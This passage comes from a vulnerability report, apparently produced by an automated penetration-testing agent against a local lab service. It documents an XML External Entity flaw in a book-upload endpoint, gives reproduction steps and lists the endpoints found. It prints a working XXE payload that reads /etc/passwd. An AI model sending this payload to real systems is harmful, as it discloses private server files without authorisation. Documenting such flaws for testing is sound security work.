ogy details: Werkzeug/3.1.4 server\\n\\n## Confirmed Vulnerability\\n### XML External Entity (XXE) Injection\\n- Affected endpoint / component: POST /addbook\\n- Impact: Potential for file disclosure, SSRF, and other XXE-related attacks via malicious XML payloads\\n- Preconditions: None - endpoint is publicly accessible without authentication\\n- Exact payload or PoC:\\n```xml\\n<?xml version=\\"1.0\\"?>\\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]>\\n<Book>\\n<Title>Test</Title>\\n<ISBN>&xxe;</ISBN>\\n<Chapters>\\n<Chapter>\\n<Author>Test Author</Author>\\n</Chapter>\\n</Chapters>\\n</Book>\\n```\\n\\n## Steps to Reproduce\\n1. Send GET request to `http://127.0.0.1:32999/` to view the home page with XML upload link\\n2. Send POST request to `http://127.0.0.1:32999/addbook` with `xml` parameter containing XML book structure\\n3. Observe that the application parses XML without disabling external entities\\n\\n## Valid Working Endpoints\\n\\n### GET / (Home Page)\\n- Purpose: Displays library service home page with XML upload functionality link\\n- Authentication: None required\\n- Response: 200 OK with HTML content\\n\\n### POST /addbook\\n- Purpose: Accepts XML book data for adding books to library\\n- Authentication: None required\\n- Parameters:\\n  - `xml`: Raw XML string containing book structure\\n- Required XML Format:\\n```xml\\n<?xml version=\\"1.0\\"?>\\n<Book>\\n<Title>Title Here</Title>\\n<ISBN>ISBN-Here</ISBN>\\n<Chapters>\\n<Chapter>\\n<Author>Author Name</Author>\\n</Chapter>\\n</Chapters>\\n</Book>\\n```\\n\\n## Non-Existent Endpoints (404 Confirmed)\\nThe following endpoints were tested and returned 404 Not Found:\\n- `/login`\\n- `/register`\\n- `/api`\\n- `/library`\\n- `/books`\\n- `/admin`\\n- `/upload`\\n\\n## Validation / Evidence\\n- Validation token / flag: Not observed - reconnaissance phase only\\n- Tool evidence: Requester agent confirmed 2 working endpoints and 7 non-existent endpoints\\n- Request evidence: POST request